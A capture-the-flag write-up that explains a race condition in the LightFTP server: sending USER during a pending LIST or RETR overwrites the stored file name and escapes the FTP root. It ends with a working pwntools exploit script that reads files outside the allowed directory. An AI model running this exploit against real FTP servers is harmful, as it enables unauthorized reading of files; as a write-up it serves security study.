# non heavy ftp

We are given read-only access to a [LightFTP](https://github.com/hfiref0x/LightFTP) instance configured to only allow access to `/server/data/`. The flag, however, is at `/flag.<some unknown uuid>`. We, therefore, need to find a way to escape `/server/data/` when listing and retrieving files.

LightFTP implements file operations such as LIST and RETR as follows
1. Parsse the command
2. Normalize the file name (i.e. remove any `..`) and prefix it with the FTP root.
3. Write the filename to the control connection's `context->FileName`.
4. Check that the file exists and is of the right type.
5. Launch a thread for the data connection that
    1. Establishes the connection. For passive mode, this means waiting for the client to connect.
    2. Reads the filename from the control connection's `context->FileName`.
    3. Performs the file operation.
    4. Sends the response to the client.

Since LightFTP only validates login credentials once we provide the password, it needs to store the username provided by the USER command somewhere until we send the PASS command. It does so in the control connection's `context->FileName`. We can, therefore, set the `FileName` to a nearly arbitrary value between it being set to a known safe value and it actually being read in the data connection's thread.

```
from pwn import *

def run(fake, file):
    host = "47.89.253.219"
    r = connect(host, 2121)
    r.sendlineafter("ready\r\n", "USER anonymous\r")
    r.sendlineafter("required\r\n", "PASS any-password-will-be-accepted\r")
    r.sendlineafter("proceed.\r\n", "PASV\r")
    port = r.readlineS()
    port = port.split("(")[1].split(")")[0].split(",")
    port = int(port[-2])*256+int(port[-1])
    r.sendline(fake + "\r")
    r.sendlineafter("connection.\r\n", f"USER {file}\r")
    return connect(host, port).readallS()

path = [x for x in run("LIST", "/").split() if x.startswith("flag.")][0]
print(run("RETR hello.txt", f"/{path}"))
```